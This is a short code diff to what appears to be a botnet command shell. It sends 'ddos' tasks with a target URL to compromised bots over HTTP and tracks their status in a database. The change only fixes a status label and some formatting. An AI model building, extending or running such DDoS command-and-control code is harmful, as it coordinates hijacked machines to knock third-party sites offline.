@@ -99,9 +99,9 @@ class CommandShell(cmd.Cmd):
                 db.updateLastTask("ddos", body['url'], bot['mac_address'], BotStatus.RUNNING)
                 requests.post(f"http://{bot['ip_address']}:{bot['listening_port']}/ddos", json=body)
                 db.updateLastTask("ddos", body['url'], bot['mac_address'], BotStatus.ONLINE)
-            except ConnectionError as e:
+            except ConnectionError:
                 print(f"{bot['mac_address']} is offline.")
-                db.updateLastTask("failed_systeminfo", None, bot['mac_address'], BotStatus.OFFLINE)
+                db.updateLastTask("failed_ddos", None, bot['mac_address'], BotStatus.OFFLINE)
             except Exception:
                 print(f"{bot['mac_address']} DDOS failed.")
                 db.updateLastTask("failed_ddos", body['url'], bot['mac_address'], BotStatus.ONLINE)
@@ -125,7 +125,6 @@ class CommandShell(cmd.Cmd):
     def do_clear(self, args):
         'Clear the CLI'
         os.system("clear")
-
 
 def split_string(string):
     parts = re.findall(r'"[^"]+"|\S+', string)
